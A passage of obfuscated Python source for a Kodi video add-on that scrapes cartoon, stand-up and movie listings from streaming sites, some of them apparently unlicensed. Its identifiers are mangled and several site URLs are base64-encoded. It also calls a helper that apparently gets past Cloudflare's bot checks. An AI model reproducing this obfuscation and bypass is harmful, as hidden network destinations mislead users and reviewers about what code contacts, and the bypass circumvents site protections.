 I1111I1II11 ( '[COLORgreen]BY GENRE[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20003 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 78 - 78: Ooo00oOo00o % iI1Ii11iII1 * i1IIi
def O0iI ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( 'href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  if '?c=' in url :
   I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 15 - 15: O0 / Oo % ii11ii1ii + OOooOOo
def iiiIiI ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( 'href="(.+?)" title="(.+?)">/n(.+?)</a><br/>' , re . DOTALL ) . findall ( oO0 )
 for url , IiiIIIiI1ii , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Genre' in url :
   I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 78 - 78: O0 * i11i1
def iIii1Ooo0oO0 ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( 'src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( oO0 )
 for url , IiiIIIiI1ii , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , IiiIIIiI1ii )
  if 86 - 86: O0
def O0o0oOooOoOo ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( '<img width="120" height="165" src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( oO0 )
 for url , IiiIIIiI1ii , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , IiiIIIiI1ii )
  if 49 - 49: i11i1 . ii11ii1ii . i11iIiiIii - OoOoOO00 / oO0O
  if 62 - 62: i11i1
  if 1 - 1: iI1Ii11iII1 / iI1Ii11iII1 - i11iIiiIii
  if 87 - 87: Oo / O0 * iI1Ii11iII1 / OOooOOo
  if 19 - 19: I1I1ii + i1IIi . OOOo0 - Oo
def iIi1I1 ( ) :
 if 63 - 63: II1i1IiiIIi11 * ii11ii1ii . OoooooooOO / i11i1 * Oo . oOO
 O00OOOoOoo0O ( '[COLORgreen]Cartoons[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) , 10004 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Search Cartoons[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if 62 - 62: i1IIi / oOO . OOOo0 * OOooOOo
def i11i1Ii1 ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) )
 OoOO0oo0o = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
   if 'Dad!' in OO0ooOOO0OOO :
    pass
   elif 'Family Guy' in OO0ooOOO0OOO :
    pass
   elif '2 Stupid' in OO0ooOOO0OOO :
    pass
   elif 'The Zelfs' in OO0ooOOO0OOO :
    pass
   elif 'A Clone' in OO0ooOOO0OOO :
    pass
   elif 'A.T.O.M' in OO0ooOOO0OOO :
    pass
   elif 'Almost Naked' in OO0ooOOO0OOO :
    pass
   elif 'Angry Kid' in OO0ooOOO0OOO :
    pass
   elif 'Annoying Orange' in OO0ooOOO0OOO :
    pass
   elif 'Aqua Teen' in OO0ooOOO0OOO :
    pass
   elif 'Assy Mcgee' in OO0ooOOO0OOO :
    pass
   elif 'Astroblast' in OO0ooOOO0OOO :
    pass
   elif 'Atomic Betty' in OO0ooOOO0OOO :
    pass
   elif 'Axe Cop' in OO0ooOOO0OOO :
    pass
   elif 'Baby Playpen' in OO0ooOOO0OOO :
    pass
   elif 'Beavis and Butt' in OO0ooOOO0OOO :
    pass
   elif 'Celebrity Deathmatch' in OO0ooOOO0OOO :
    pass
   elif 'Clerks The' in OO0ooOOO0OOO :
    pass
   elif 'Crapston Villas' in OO0ooOOO0OOO :
    pass
   elif 'Duckman:' in OO0ooOOO0OOO :
    pass
   elif 'Stripperella' in OO0ooOOO0OOO :
    pass
   elif 'Vixen' in OO0ooOOO0OOO :
    pass
   else :
    O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 98 - 98: I1I1ii
def o0oo0000 ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Dad!' in OO0ooOOO0OOO :
   pass
  elif 'Family Guy' in OO0ooOOO0OOO :
   pass
  elif '2 Stupid' in OO0ooOOO0OOO :
   pass
  elif 'The Zelfs' in OO0ooOOO0OOO :
   pass
  elif 'A Clone' in OO0ooOOO0OOO :
   pass
  elif 'A.T.O.M' in OO0ooOOO0OOO :
   pass
  elif 'Almost Naked' in OO0ooOOO0OOO :
   pass
  elif 'Angry Kid' in OO0ooOOO0OOO :
   pass
  elif 'Annoying Orange' in OO0ooOOO0OOO :
   pass
  elif 'Aqua Teen' in OO0ooOOO0OOO :
   pass
  elif 'Assy Mcgee' in OO0ooOOO0OOO :
   pass
  elif 'Astroblast' in OO0ooOOO0OOO :
   pass
  elif 'Atomic Betty' in OO0ooOOO0OOO :
   pass
  elif 'Axe Cop' in OO0ooOOO0OOO :
   pass
  elif 'Baby Playpen' in OO0ooOOO0OOO :
   pass
  elif 'Beavis and Butt' in OO0ooOOO0OOO :
   pass
  elif 'Celebrity Deathmatch' in OO0ooOOO0OOO :
   pass
  elif 'Clerks The' in OO0ooOOO0OOO :
   pass
  elif 'Crapston Villas' in OO0ooOOO0OOO :
   pass
  elif 'Duckman:' in OO0ooOOO0OOO :
   pass
  elif 'Stripperella' in OO0ooOOO0OOO :
   pass
  elif 'Vixen' in OO0ooOOO0OOO :
   pass
  else :
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 42 - 42: I1I1ii + I1I1ii * OoOoOO00
def o0Oo ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 II11i1I11Ii1i = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( IIIII1II )
 for IIIIiI11I11 in II11i1I11Ii1i :
  o0O0 = IIIIiI11I11
 I1I1Iiii1 = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( IIIII1II )
 for url in I1I1Iiii1 :
  O00OOOoOoo0O ( '[COLORgreen]NEXT PAGE[/COLOR]' , url , 10006 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 OoOO0oo0o = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 10007 , o0O0 )
  if 2 - 2: OOoo0OO0 + oOO
  if 76 - 76: I1I1ii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 99 - 99: OOOo0 + i1IIi + i11iIiiIii + Oo % Ooo0OO0oOO / OOoo0OO0
def O0OO0o0OO0OO ( url , IMAGE ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , url in OoOO0oo0o :
  print OO0ooOOO0OOO + '     ' + url
  if 'easy' in url :
   oOo0O ( url )
   if 43 - 43: OOooOOo . II1i1IiiIIi11 . OOoo0OO0 + iIii1I11I1II1
   if 78 - 78: iIii1I11I1II1 % I1IiI + ii11ii1ii / i1IIi % OoOoOO00 + i11i1
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 91 - 91: iIii1I11I1II1 % Ooo00oOo00o . OOooOOo + oO0O + OOooOOo
def oOo0O ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( "url: '(.+?)'," ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  o00OOo ( url )
  if 87 - 87: Ooo00oOo00o % OOOo0
  if 77 - 77: iIii1I11I1II1 - i1IIi . Ooo0OO0oOO
  if 26 - 26: OOooOOo * iI1Ii11iII1 . i1IIi
def ooOoOO ( ) :
 if 56 - 56: iIii1I11I1II1 . i11iIiiIii - i11i1 * OoOoOO00 * I1I1ii
 O00OOOoOoo0O ( '[COLORgreen]Stand Up[/COLOR]' , '' , 10014 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Search Comedian[/COLOR]' , '' , 10015 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Others[/COLOR]' , '' , 10017 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if 5 - 5: i11i1 / i11i1 - ii11ii1ii
def oO0ooOOiii1iII1 ( ) :
 oO0 = i11iIIIIIi1 ( ( i1111 ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC9zdGFuZHVwbGlzdC5waHA=' ) ) )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( oO0 )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  if 'elete' in OO0ooOOO0OOO :
   pass
  else :
   IIi1I ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 222 , IIIIiI11I11 )
   if 62 - 62: OOoo0OO0
def O000oOo ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 oO0 = i11iIIIIIi1 ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 OoOOOO = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , I1iiIi111I , iIiiiI1IiI1I1 in OoOOOO :
  for Ooo0OOoOoO0 in I1iiIi111I :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< img >>>>>>>>>>>>>>>>>>>>>>>>>>'
   Iiii1iIii = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
   for I1i11i , OO0ooOOO0OOO in Iiii1iIii :
    if 'tube' in I1i11i :
     pass
    elif 'stage' in I1i11i :
     IIi1I ( '[COLORgreen]' + I1iiIi111I + '   -   ' + OO0ooOOO0OOO + '[/COLOR]' , ( I1i11i ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + IIIIiI11I11 , )
    elif 'vee' in I1i11i :
     pass
     if 69 - 69: Ooo0OO0oOO % OoooooooOO . OOOo0
def I1III1II1I11 ( ) :
 oO0 = i11iIIIIIi1 ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 OoOOOO = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , I1iiIi111I , iIiiiI1IiI1I1 in OoOOOO :
  Iiii1iIii = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
  for I1i11i , OO0ooOOO0OOO in Iiii1iIii :
   if 'tube' in I1i11i :
    pass
   elif 'stage' in I1i11i :
    IIi1I ( '[COLORgreen]' + I1iiIi111I + '   -   ' + OO0ooOOO0OOO + '[/COLOR]' , ( I1i11i ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + IIIIiI11I11 )
   elif 'vee' in I1i11i :
    pass
    if 30 - 30: OOooOOo / i11i1 / iI1Ii11iII1 % oOO + OoOoOO00
    if 4 - 4: II1i1IiiIIi11 - Oo - iI1Ii11iII1 - OOoo0OO0 % i11iIiiIii / Ooo00oOo00o
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 50 - 50: oOO + i1IIi
def i11IiIIi11I ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 print '>>>>>>>>>>>>>>>>>>>>>>>>' + url + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 I1ii1ii11i1I = re . compile ( "url\[.+?\] = '(.+?)';" ) . findall ( oO0 )
 print '>>>>>>>>>>>>>>>>>>>>>>>' + ( str ( I1ii1ii11i1I ) ) + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 for url in I1ii1ii11i1I :
  o00OOo ( ( url ) . replace ( '[' , '' ) . replace ( ']' , '' ) . replace ( '\'' , '' ) )
  if 78 - 78: iI1Ii11iII1
  if 83 - 83: iIii1I11I1II1 % I1IiI % OOooOOo % I1I1ii . ii11ii1ii % O0
  if 47 - 47: OOooOOo
  if 66 - 66: OOOo0 - iI1Ii11iII1
  if 33 - 33: OOOo0 / Ooo00oOo00o
  if 12 - 12: OoOoOO00
  if 2 - 2: i1IIi - OOOo0 + OOoo0OO0 . OoOoOO00
def iIIiI1iiI ( ) :
 if 18 - 18: II1i1IiiIIi11 - Ooo0OO0oOO % II1i1IiiIIi11 / OOoo0OO0
 O0Oo00OO00Ooo ( '[COLOR darkgoldenrod]Open Pandora\'s Box[/COLOR]' , '' , 10029 , 'https://encrypted-tbn1.gstatic.com/images?q=tbn%3AANd9GcTQ9r4TA8yIw9ggxuwsHxWojo6tPVfgTe8QIOxOQwzNR2TavtCi6Q' , i1iiIII111ii , '' )
 O0Oo00OO00Ooo ( '[COLOR darkgoldenrod]Search[/COLOR]' , '' , 10026 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 87 - 87: Oo * i11i1 % iI1Ii11iII1 % I1IiI
 Oo0oO ( 'movies' , 'MAIN' )
 if 4 - 4: I1IiI + oO0O / Ooo0OO0oOO
def i1iI1IIIII1 ( ) :
 O0Oo00OO00Ooo ( 'Search Pandoras Films' , '' , 10027 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 O0Oo00OO00Ooo ( 'Search Pandoras TV' , '' , 10028 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 39 - 39: ii11ii1ii % Ooo00oOo00o % oO0O
 Oo0oO ( 'movies' , 'MAIN' )
def oo0OOOOO0 ( ) :
 if 18 - 18: iIii1I11I1II1 . oO0O % I1IiI + O0 - iI1Ii11iII1 % I1I1ii
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 ooO = [ 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 39 - 39: i11i1 / ii11ii1ii / OOOo0 * I1I1ii
 for Iii1Ii in ooO :
  ii11I11i = IIiiiiiiIi1I1 + Iii1Ii + II11iiii1Ii
  oO0 = i11iIIIIIi1 ( ii11I11i )
  OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oO0 )
  for I1i11i , IiI , oOoO00o , iI1ii1i , OO0ooOOO0OOO in OoOO0oo0o :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    oOOOOi11i11 ( OO0ooOOO0OOO , I1i11i , 222 , IiI , iI1ii1i , oOoO00o )
    if 14 - 14: i11iIiiIii
    Oo0oO ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 73 - 73: oOO + Ooo0OO0oOO . Ooo00oOo00o
    if 46 - 46: Ooo00oOo00o - OOooOOo / I1IiI - OoooooooOO + Ooo0OO0oOO
def OOOOI1iI1i11 ( ) :
 if 99 - 99: O0 + O0 * OOoo0OO0 + O0 * Ooo0OO0oOO
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 ooO = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 80 - 80: OOOo0 . oO0O
 for Iii1Ii in ooO :
  I1I11ii = IIiiiiiiIi1I1 + Iii1Ii + II11iiii1Ii
  oO0 = i11iIIIIIi1 ( I1I11ii )
  OoOO0oo0o = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( oO0 )
  for OO0ooOOO0OOO , oOoO00o , I1i11i , IIIIiI11I11 , iI1ii1i , OOoOoo00Oo in OoOO0oo0o :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    O0Oo00OO00Ooo ( OO0ooOOO0OOO , I1i11i , OOoOoo00Oo , IIIIiI11I11 , iI1ii1i , oOoO00o )
    if 9 - 9: OoOoOO00 * OoOoOO00 . i11iIiiIii * iIii1I11I1II1
    Oo0oO ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 18 - 18: Ooo00oOo00o . OoOoOO00 % I1IiI % oO0O
    if 87 - 87: iIii1I11I1II1 . OoooooooOO * I1IiI
def OOOo ( ) :
 if 74 - 74: oO0O - OoooooooOO . Oo
 IIIII1II = i11iIIIIIi1 ( IIiiiiiiIi1I1 + 'spongemain.php' )
 OoOO0oo0o = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , oOoO00o , I1i11i , IIIIiI11I11 , iI1ii1i , OOoOoo00Oo in OoOO0oo0o :
  O0Oo00OO00Ooo ( OO0ooOOO0OOO , I1i11i , OOoOoo00Oo , IIIIiI11I11 , iI1ii1i , oOoO00o )
  Oo0oO ( 'movies' , 'MAIN' )
def III1Ii1i1I1 ( url ) :
 if 97 - 97: I1I1ii . oOO - I1I1ii + OOOo0 * OoOoOO00
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 I111Ii = ( '%s%s' % ( II11iIi , url ) )
 oo0OoOOO0o0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oo0OoOOO0o0 )
 for url , IiI , oOoO00o , ii , OO0ooOOO0OOO in OoOO0oo0o :
  oOOOOi11i11 ( OO0ooOOO0OOO , url , 222 , IiI , ii , oOoO00o )
  if 94 - 94: oOO * OOoo0OO0 - iI1Ii11iII1 . iIii1I11I1II1
  Oo0oO ( 'movies' , 'MAIN' )
  if 66 - 66: oOO - i11i1 * I1IiI / Ooo0OO0oOO * OoOoOO00 * Ooo00oOo00o
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 91 - 91: OoooooooOO / oO0O . OOOo0 + oOO . OoOoOO00
  if 45 - 45: Ooo0OO0oOO * I1IiI / iIii1I11I1II1
def o00ooOoO0 ( url ) :
 if 15 - 15: i11i1 * OOoo0OO0 / ii11ii1ii * OOooOOo
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , oOoO00o , url , IIIIiI11I11 , iI1ii1i , OOoOoo00Oo in OoOO0oo0o :
  O0Oo00OO00Ooo ( OO0ooOOO0OOO , url , OOoOoo00Oo , IIIIiI11I11 , iI1ii1i , oOoO00o )
  if 94 - 94: II1i1IiiIIi11 + oO0O % OOooOOo
  Oo0oO ( 'movies' , 'MAIN' )
  if 1 - 1: I1IiI % I1I1ii - i11i1 + Ooo0OO0oOO + O0 * OOooOOo
  if 97 - 97: I1IiI
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 77 - 77: i11iIiiIii / OoooooooOO + iI1Ii11iII1 % Ooo0OO0oOO
def oOOOOi11i11 ( name , url , mode , iconimage , fanart , description ) :
 if 36 - 36: Ooo0OO0oOO
 o0OO = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 II1I1 = True
 iii11I11iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iii11I11iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iii11I11iI1 . setProperty ( "Fanart_Image" , fanart )
 II1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0OO , listitem = iii11I11iI1 , isFolder = False )
 return II1I1
 if 4 - 4: i11i1
def O0Oo00OO00Ooo ( name , url , mode , iconimage , fanart , description ) :
 if 48 - 48: OOoo0OO0 . OoooooooOO . OOOo0 . I1IiI % ii11ii1ii / II1i1IiiIIi11
 o0OO = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 II1I1 = True
 iii11I11iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iii11I11iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iii11I11iI1 . setProperty ( "Fanart_Image" , fanart )
 II1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0OO , listitem = iii11I11iI1 , isFolder = True )
 return II1I1
if 11 - 11: i1IIi % Ooo00oOo00o % II1i1IiiIIi11
if 99 - 99: oOO / iIii1I11I1II1 - oO0O * ii11ii1ii % OOOo0
if 13 - 13: Ooo00oOo00o
if 70 - 70: I1I1ii + O0 . Ooo0OO0oOO * oO0O
if 2 - 2: OoooooooOO . i11i1 . iI1Ii11iII1
if 42 - 42: i11i1 % Ooo0OO0oOO / Ooo00oOo00o - Ooo0OO0oOO * i11iIiiIii
if 19 - 19: Ooo0OO0oOO * OOOo0 % i11iIiiIii
if 24 - 24: OOooOOo
if 10 - 10: OOooOOo % oO0O / i11i1
if 28 - 28: i11i1 % oOO
if 48 - 48: i11iIiiIii % Ooo0OO0oOO
if 29 - 29: II1i1IiiIIi11 + i11iIiiIii % OOoo0OO0
if 93 - 93: I1IiI % iIii1I11I1II1
if 90 - 90: OOOo0 - i11i1 / oO0O / O0 / OOoo0OO0
if 87 - 87: I1IiI / iI1Ii11iII1 + iIii1I11I1II1
def oo0O0o ( string ) :
 if I11iii1Ii == 'true' :
  xbmc . log ( "[addon.live.GenieTV-%s]: %s" % ( addon_version , string ) )
  if 13 - 13: iIii1I11I1II1 . I1IiI * OOOo0 / Ooo0OO0oOO * oO0O
def O00o ( name , url , iconimage , fanart , mode , playlist = None , regexs = None ) :
 oO0o00ooO0OoO = [ ]
 try :
  if 1 - 1: I1IiI . i11iIiiIii % I1IiI - II1i1IiiIIi11 % i1IIi + ii11ii1ii
  name = name . encode ( 'utf-8' , 'ignore' )
 except :
  pass
 if os . path . exists ( o0 ) == False :
  oo0O0o ( 'Making Favorites File' )
  oO0o00ooO0OoO . append ( ( name , url , iconimage , fanart , mode , playlist , regexs ) )
  IiII1 = open ( o0 , "w" )
  IiII1 . write ( json . dumps ( oO0o00ooO0OoO ) )
  IiII1 . close ( )
 else :
  oo0O0o ( 'Appending Favorites' )
  IiII1 = open ( o0 ) . read ( )
  IiiIiIi111iI1 = json . loads ( IiII1 )
  IiiIiIi111iI1 . append ( ( name , url , iconimage , fanart , mode ) )
  iIO0O00OOo = open ( o0 , "w" )
  iIO0O00OOo . write ( json . dumps ( IiiIiIi111iI1 ) )
  iIO0O00OOo . close ( )
  if 88 - 88: Oo % Ooo0OO0oOO + iI1Ii11iII1
  if 8 - 8: i11iIiiIii / OoOoOO00 + OOooOOo * oO0O % iI1Ii11iII1 . OOoo0OO0
def I1iIIIiIi1 ( ) :
 IiI1O0oO = json . loads ( open ( o0 ) . read ( ) )
 IiIII = len ( IiI1O0oO )
 for IIiI1111i1 in IiI1O0oO :
  OO0ooOOO0OOO = IIiI1111i1 [ 0 ]
  I1i11i = IIiI1111i1 [ 1 ]
  IiI = IIiI1111i1 [ 2 ]
  try :
   ii1ii1I1IIi1 = IIiI1111i1 [ 3 ]
   if ii1ii1I1IIi1 == None :
    raise
  except :
   if o0oO0 . getSetting ( 'use_thumb' ) == "true" :
    ii1ii1I1IIi1 = IiI
   else :
    ii1ii1I1IIi1 = iI1ii1i
  try : oOOoo0 = IIiI1111i1 [ 5 ]
  except : oOOoo0 = None
  try : IIIIiI11I = IIiI1111i1 [ 6 ]
  except : IIIIiI11I = None
  if 31 - 31: oO0O
  if IIiI1111i1 [ 4 ] == 0 :
   O00OOOoOoo0O ( OO0ooOOO0OOO , I1i11i , '' , IiI , iI1ii1i , '' , 'fav' )
  else :
   O00OOOoOoo0O ( OO0ooOOO0OOO , I1i11i , IIiI1111i1 [ 4 ] , IiI , iI1ii1i , '' , 'fav' )
   if 18 - 18: oOO + oO0O
def ii11i11 ( name ) :
 IiiIiIi111iI1 = json . loads ( open ( o0 ) . read ( ) )
 for OooiiIii in range ( len ( IiiIiIi111iI1 ) ) :
  if IiiIiIi111iI1 [ OooiiIii ] [ 0 ] == name :
   del IiiIiIi111iI1 [ OooiiIii ]
   iIO0O00OOo = open ( o0 , "w" )
   iIO0O00OOo . write ( json . dumps ( IiiIiIi111iI1 ) )
   iIO0O00OOo . close ( )
   break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
 if 35 - 35: OoooooooOO - I1I1ii / Ooo00oOo00o
 if 50 - 50: I1IiI
def I11i1II ( ) :
 i1i1Ii11Ii = os . path . join ( iIii1 , 'addons.ini' )
 O000oOoIiiIIi1 = open ( i1i1Ii11Ii , "w+" )
